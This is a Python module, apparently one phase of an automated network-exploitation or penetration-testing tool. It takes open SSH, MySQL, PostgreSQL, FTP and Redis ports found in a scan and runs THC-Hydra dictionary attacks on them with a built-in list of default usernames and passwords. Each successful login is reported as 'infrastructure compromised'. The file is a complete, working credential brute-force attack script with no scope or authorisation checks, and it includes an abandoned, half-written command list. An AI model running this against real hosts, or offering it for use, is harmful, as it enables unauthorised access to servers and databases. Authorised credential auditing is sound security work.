import subprocess
import re
import os
import logging
from rich.console import Console

console = Console()
log = logging.getLogger("rich")

# The Snipe Dictionary: Only the most lethal, default misconfigurations
CREDENTIALS = {
    22: {"protocol": "ssh", "users": "root,admin,ubuntu,centos", "passwords": "root,admin,password,ubuntu,centos"},
    3306: {"protocol": "mysql", "users": "root,admin", "passwords": "root,admin,password"},
    5432: {"protocol": "postgres", "users": "postgres,root,admin", "passwords": "postgres,root,admin,password"},
    21: {"protocol": "ftp", "users": "anonymous,root,admin", "passwords": "anonymous,root,admin"},
    6379: {"protocol": "redis", "users": "default,root", "passwords": "root,admin,password,redis"}
}

def run_hydra(session, config):
    console.print("\n[bold blue]━━ PHASE 1.7: PROJECT HYDRA (NETWORK EXPLOITATION) ━━[/bold blue]")
    
    # 1. Extract raw, unmasked IPs and Ports from the State Graph
    # Kestrel's port scanner usually logs open ports as "ip:port" or "domain:port"
    targets = []
    for host in session.get_live_hosts():
        if isinstance(host, dict) and 'ports' in host:
            ip = host.get('ip') or host.get('host')
            for port in host['ports']:
                if port in CREDENTIALS:
                    targets.append((ip, port))

    # Fallback: If session data structure differs, we check vulnerabilities for open ports
    if not targets:
        for vuln in session.vulnerabilities:
            if "Exposed Port" in vuln.get("name", ""):
                try:
                    # Extract domain/IP and port from matched-at (e.g., "sandbox.target.com:3306")
                    match_data = vuln.get("matched-at", "").split(":")
                    if len(match_data) == 2:
                        host, port = match_data[0], int(match_data[1])
                        if port in CREDENTIALS:
                            targets.append((host, port))
                except: pass

    # Deduplicate targets
    targets = list(set(targets))

    if not targets:
        console.print("WARNING  No exploitable network services (SSH/MySQL/DB) found on exposed Origins. Skipping Hydra.")
        return

    console.print(f"INFO     Spawning Network Socket Bruteforcers against {len(targets)} exposed services...")

    # 2. Execute the Snipe Attack
    for host, port in targets:
        payload = CREDENTIALS[port]
        protocol = payload["protocol"]
        
        console.print(f"INFO     Deploying {protocol.upper()} Dictionary Strike against {host}:{port}...")
        
        # Build the Hydra command
        cmd = [
            "hydra",
            "-l", payload["users"].split(",")[0] if "," not in payload["users"] else "root", # Quick hack for inline
            "-L", "-", # We will pipe the users via stdin or create temp files. Actually, Hydra accepts comma-separated with -l/-p? No, it needs files.
        ]
        
        # To keep it memory-clean, we use Hydra's loopback or direct login args
        # THC-Hydra allows -L <file> or -l <login>. For multiple, we must write a quick temp file.
        with open(".hydra_users.txt", "w") as uf:
            uf.write(payload["users"].replace(",", "\n"))
        with open(".hydra_pass.txt", "w") as pf:
            pf.write(payload["passwords"].replace(",", "\n"))

        strike_cmd = [
            "hydra", 
            "-L", ".hydra_users.txt", 
            "-P", ".hydra_pass.txt", 
            "-t", "4",          # 4 parallel tasks
            "-w", "3",          # 3 second timeout
            "-I",               # Ignore restore files
            f"{protocol}://{host}:{port}"
        ]

        try:
            process = subprocess.run(strike_cmd, capture_output=True, text=True, timeout=45)
            output = process.stdout
            
            # Check for success
            # Example Hydra output: [3306][mysql] host: 104.26.0.97   login: root   password: root
            success_matches = re.findall(r"host:.*?login:\s*(.*?)\s*password:\s*(.*)", output, re.IGNORECASE)
            
            if success_matches:
                for match in success_matches:
                    username, password = match[0], match[1]
                    console.print(f"[bold red]  ! [CRITICAL] {protocol.upper()} INFRASTRUCTURE COMPROMISED: {host}:{port} ({username}:{password})[/bold red]")
                    
                    session.vulnerabilities.append({
                        "type": "VULN",
                        "name": f"Default Credentials ({protocol.upper()})",
                        "matched-at": f"{protocol}://{host}:{port}",
                        "info": {
                            "severity": "CRITICAL",
                            "description": f"Successfully authenticated using {username}:{password}"
                        }
                    })
            else:
                console.print(f"  + {host}:{port} secured against default credentials.")

        except subprocess.TimeoutExpired:
            console.print(f"  ! Timeout hitting {host}:{port}. Host likely dropped packets.")
        except Exception as e:
            log.error(f"Hydra Engine Error: {e}")

    # Cleanup
    if os.path.exists(".hydra_users.txt"): os.remove(".hydra_users.txt")
    if os.path.exists(".hydra_pass.txt"): os.remove(".hydra_pass.txt")
